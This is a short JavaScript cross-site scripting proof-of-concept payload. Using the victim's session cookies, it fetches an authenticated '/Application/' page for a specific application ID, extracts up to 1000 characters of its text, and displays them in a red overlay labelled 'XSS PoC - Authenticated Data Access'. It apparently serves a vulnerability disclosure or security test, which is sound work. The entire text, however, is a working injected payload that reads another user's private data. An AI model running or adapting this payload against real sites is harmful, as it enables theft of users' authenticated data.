fetch('/Application/?applicationId=1cb51575-d5bc-f111-aaaf-7c1e521e7886',{credentials:'include'})
.then(r=>r.text()).then(d=>{
  var parser=new DOMParser();
  var doc=parser.parseFromString(d,'text/html');
  var content=doc.body.innerText.replace(/\s+/g,' ').trim().slice(0,1000);
  var div=document.createElement('div');
  div.style='position:fixed;top:0;left:0;width:100%;background:#cc0000;color:#fff;z-index:99999;padding:20px;font-size:13px;font-family:monospace;word-wrap:break-word;max-height:50%;overflow:auto;';
  div.innerHTML='<b>XSS PoC - Authenticated Data Access</b><br><br>'+content;
  document.body.appendChild(div);
});